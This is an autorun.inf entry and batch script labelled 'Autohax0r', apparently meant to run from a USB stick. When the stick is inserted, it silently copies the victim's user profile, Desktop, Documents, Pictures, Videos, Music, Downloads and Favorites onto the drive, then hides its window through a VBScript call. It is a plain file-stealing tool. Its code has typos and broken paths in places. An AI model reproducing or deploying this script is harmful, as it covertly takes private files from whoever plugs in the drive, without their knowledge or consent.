[autorun].
label=Autohax0r
icon=1.ico
open=lanuch.bat
action=Begin Autohax0r

::variables
/min
SET odrive=%drive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y 
echo off
%backupcmd%"%USERPROFILE%" "%drive%/Lucky\Favorites" 
%backupcmd%"%USERPROFILE%\Favorites" "%drive%\Lucky\Favorties"
%backupcmd%"%USERPROFILE%\videos" "%drive%\Lucky\vids"
%backupcmd%"%USERPROFILE%\Desktop" "%drive%\Lucky\Desktop"
%backupcmd%"%USERPROFILE%\Recycle Bin" "%drive%\Lucky\Desktop"
%backupcmd%"%USERPROFILE%\Downloads" "%drive%\Lucky\Lib"
%backupcmd% "%USERPROFILE%\Documents""%drive%\Lucky\dou"
%backupcmd% "%USERPROFILE%\Pictures""%drive%\Lucky\dou"
%backupcmd% "%USERPROFILE%\Videos""%drive%\Lucky\dou"
%backupcmd% "%USERPROFILE%\Music""%drive%\Lucky\dou"
cls
WScript.exe\invisible.vbs fil
